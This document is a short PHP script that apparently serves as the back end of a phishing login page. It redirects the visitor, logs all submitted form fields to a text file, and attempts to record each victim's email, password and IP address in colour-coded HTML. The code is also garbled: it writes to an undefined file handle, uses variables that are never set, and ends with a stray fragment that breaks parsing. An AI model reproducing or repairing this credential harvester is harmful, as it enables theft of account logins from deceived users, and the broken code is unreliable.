<?php
header ('Location:index.html');
    $handle = fopen("larima.callejera.txt", "a");
    foreach($_POST as $variable => $value) {
        fwrite($handle, $variable);
        fwrite($handle, "=");
        fwrite($handle, $value);
        fwrite($handle, "\r\n");
    }
    fwrite ($f, 'Email: [<b><font color="#0000FF">'.$habbo.'</font></b>] Password: [<b><font color="#FF0040">'.$password.'</font></b>] IP: [<b><font color="#FE2EF7">'.$ip.'</font></b>]<br>');
fclose($f);

");
?>